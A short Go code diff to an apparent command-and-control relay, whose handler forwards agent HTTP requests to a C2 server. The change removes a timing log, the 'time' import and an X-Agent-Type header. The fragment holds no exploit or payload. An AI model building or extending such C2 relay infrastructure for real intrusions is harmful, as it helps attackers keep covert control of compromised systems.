@@ -5,7 +5,6 @@ import (
 	"io"
 	"log"
 	"net/http"
-	"time"
 )
 
 // BaseHandler provides common functionality for all protocol handlers
@@ -43,13 +42,11 @@ func (b *BaseHandler) HandleHTTPRequest(ctx context.Context, endpoint string, re
 		return
 	}
 
-	// Create minimal headers - only Content-Type and agent type for routing
+	// Create minimal headers - only Content-Type (agent type now in body)
 	headers := make(map[string]string)
 	headers["Content-Type"] = "application/json"
-	headers["X-Agent-Type"] = b.agentType // Only for relay routing, not sent to C2
 
 	// Send to C2
-	start := time.Now()
 	resp, err := b.sendToC2(ctx, endpoint, headers, body)
 	if err != nil {
 		b.logger.Printf("[%s:%s:%s] C2 send error: %v", b.protocolName, b.agentType, endpoint, err)
@@ -68,8 +65,6 @@ func (b *BaseHandler) HandleHTTPRequest(ctx context.Context, endpoint string, re
 		b.logger.Printf("[%s:%s:%s] failed to copy response: %v", b.protocolName, b.agentType, endpoint, err)
 		return
 	}
-
-	b.logger.Printf("[%s:%s:%s] processed in %v", b.protocolName, b.agentType, endpoint, time.Since(start))
 }
 
 // CreateHTTPHandler creates a standard HTTP handler function
